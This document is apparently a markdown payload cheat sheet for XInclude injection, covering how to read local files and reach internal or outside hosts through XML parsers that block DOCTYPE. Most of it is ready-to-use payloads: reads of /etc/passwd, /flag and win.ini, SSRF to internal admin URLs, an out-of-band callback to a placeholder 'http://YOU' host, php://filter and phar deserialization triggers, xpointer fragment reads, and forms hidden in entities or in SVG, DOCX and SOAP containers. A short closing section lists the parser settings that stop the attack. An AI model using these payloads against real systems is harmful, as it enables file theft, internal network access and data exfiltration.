# XInclude — deep — the no-DOCTYPE primitive

## Why XInclude survives DOCTYPE-blocking

`<!DOCTYPE>` is blocked by `disallow-doctype-decl`/`DtdProcessing.
Prohibit` — XInclude is a separate spec (`xmlinclude`) the parser
honors via `setXIncludeAware(true)`/`XML_PARSE_XINCLUDE`/an explicit
XInclude processor — the config flag is SEPARATE from entity-control —
often left on when entities are killed.

## The minimal form

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</r>
```

`parse="text"` — the URI content lands as TEXT — no re-parse — the
file-read form.

## `parse="xml"` — the parsed form — recursive expansion

```xml
<xi:include href="file:///x.xml" parse="xml"/>
```

The included doc is parsed as XML — entities inside IT expand — a
file with entities inside gets entity-processed — the recursive-XXE
form.

## `parse="text"` + `encoding` — the charset override

```xml
<xi:include href="file:///flag" parse="text" encoding="UTF-8"/>
```

## `href` URI forms — the full scheme list

```xml
<xi:include href="file:///etc/passwd" parse="text"/>
<xi:include href="http://internal/admin" parse="text"/>      — SSRF
<xi:include href="http://YOU/x" parse="text"/>               — OOB
<xi:include href="php://filter/convert.base64-encode/resource=/flag" parse="text"/>
<xi:include href="phar:///x.phar/a" parse="text"/>           — deser trigger
<xi:include href="jar:file:///x.jar!/y" parse="text"/>
<xi:include href="/etc/passwd" parse="text"/>                — bare path
<xi:include href="file:///c:/windows/win.ini" parse="text"/>
```

## `xpointer` — the fragment-read

```xml
<xi:include href="file:///x.xml" parse="xml" xpointer="xpointer(/root/flag)"/>
<xi:include href="file:///x.xml" parse="xml" xpointer="xpointer(//secret)"/>
<xi:include href="file:///x.xml" parse="xml" xpointer="element(/1/2)"/>
```

Reads a SLICE of an XML doc — the element-level file-read — works on
XML files only.

## The `<xi:fallback>` — the graceful-degradation

```xml
<xi:include href="file:///nonexist" parse="text">
  <xi:fallback>no content</xi:fallback>
</xi:include>
```

If the include fails, the fallback text lands instead — the "did the
fetch fail" oracle without an error.

## The namespace — `xmlns:xi` variants

```xml
xmlns:xi="http://www.w3.org/2001/XInclude"      — the canonical
xmlns:xi="http://www.w3.org/2003/XInclude"      — the 2003 draft — some
                                                parsers accept both
```

## The "the parser honors XInclude but NOT entities" — the split config

`setXIncludeAware(true)` + `disallow-doctype-decl=true` — DOCTYPE dead,
XInclude live — the XInclude is the only fetch — the config-fingerprint
this combo implies.

## The "XInclude inside an entity" — the nested form

```xml
<!DOCTYPE r [<!ENTITY x "<xi:include href='file:///flag' parse='text' xmlns:xi='http://www.w3.org/2001/XInclude'/>">]>
<r>&x;</r>
```

The entity value IS an xi:include — the include fires during entity
expansion — the "entity-contains-include" trick — works when the
include is inside the entity value.

## The "XInclude inside an ATTRIBUTE" — the attr form

```xml
<r a="&x;"/>
```

with `<!ENTITY x "<xi:include ...>` — the include inside the attribute-
value — lands in the DOM attr.

## The "the XInclude is the OOB channel" — `href="http://YOU/x"`

```xml
<xi:include href="http://YOU/callback" parse="text"/>
```

The include-fetch is an OOB hit — `oob_listener` sees it — even if
the included content isn't echoed, the FETCH happened.

## The "XInclude + local file + echo" — the in-band read

```xml
<xi:include href="file:///etc/passwd" parse="text"/>
```

passwd lands in the response — the in-band file-read without DOCTYPE.

## The "XInclude + nonexistent file + error" — the error channel

```xml
<xi:include href="file:///nonexistent/..." parse="text"/>
```

The `Resource not found`/include-failure error carries the URI —
`error-based.md` — in-band error-channel read.

## The "XInclude inside an SVG/DOCX/SOAP" — the container form

```xml
<svg xmlns:xi="..."><xi:include href="file:///flag" parse="text"/></svg>
```

XInclude inside an SVG/DOCX-part/SOAP element — the container's parser
may honor XInclude — the format doesn't block it.

## The "the `xmlns:xi` attr must be right" — the namespace-keyed parse

The parser keys off `xmlns:xi="http://www.w3.org/2001/XInclude"` — a
typo'd namespace = the `xi:` prefix is unbound = parse error, not
include — the namespace string must be exact.

## Falsifiers

- `setXIncludeAware(false)` / XInclude not enabled → `<xi:include>` is
  just an unknown element → ignored → dead
- `XML_PARSE_XINCLUDE` off → same
